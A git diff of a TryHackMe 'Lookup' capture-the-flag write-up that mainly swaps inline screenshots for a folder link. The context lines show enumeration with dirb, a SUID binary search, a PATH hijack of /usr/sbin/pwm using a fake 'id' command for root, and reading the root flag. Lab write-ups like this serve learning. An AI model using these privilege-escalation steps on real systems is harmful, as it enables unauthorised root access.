@@ -20,13 +20,9 @@ Discovered open ports:
 - 22 (SSH)
 - 80 (HTTP)
 
-Performed a targeted scan for service/version detection:
 
-```bash
-nmap -sCV -p22,80 10.10.56.153
-```
 
-📸 ![Nmap scan](../screenshots/lookup/lookup_1.png)
+
 
 ---
 
@@ -40,7 +36,7 @@ Ran a directory brute-force with DirBuster using `apache-user-enum-1.txt`:
 dirb http://10.10.56.153/ /usr/share/wordlists/dirbuster/apache-user-enum-1.txt
 ```
 
-📸 ![Dirbuster output](../screenshots/lookup/lookup_2.png)
+
 
 Found `jose` as a valid user.
 
@@ -52,7 +48,7 @@ sudo nano /etc/hosts
 10.10.56.153  files.lookup.thm
 ```
 
-📸 ![Hosts file update](../screenshots/lookup/lookup_3.png)
+
 
 ---
 
@@ -60,7 +56,7 @@ sudo nano /etc/hosts
 
 After login, accessed a file browser-style interface. Tried navigating to `/home/think`, but access was restricted.
 
-📸 ![Web UI](../screenshots/lookup/lookup_4.png)
+
 
 ---
 
@@ -74,7 +70,7 @@ find / -perm /4000 2>/dev/null
 
 Found a custom binary: `/usr/sbin/pwm`
 
-📸 ![SUID search](../screenshots/lookup/lookup_5.png)
+
 
 Tried running it, and noticed it uses the `id` command. Created a fake `id` command in `/tmp` to hijack execution:
 
@@ -86,7 +82,7 @@ export PATH=/tmp:$PATH
 /usr/sbin/pwm
 ```
 
-📸 ![PATH Hijack](../screenshots/lookup/lookup_6.png)
+
 
 This allowed root privilege execution.
 
@@ -100,7 +96,7 @@ Accessed root’s home directory and read the `root.txt` flag:
 cat /root/root.txt
 ```
 
-📸 ![Flag Capture](../screenshots/lookup/lookup_7.png)
+
 
 ---
 
@@ -122,5 +118,5 @@ cat /root/root.txt
 - `/etc/hosts` manipulation is crucial for resolving internal services
 
 ---
-
+🖼️ **Find all screenshots here:** [`screenshots/lookup/`](../screenshots/lookup/)
 📁 [Back to TryHackMe Write-Ups](./README.md) | [Back to Portfolio Home](../README.md)
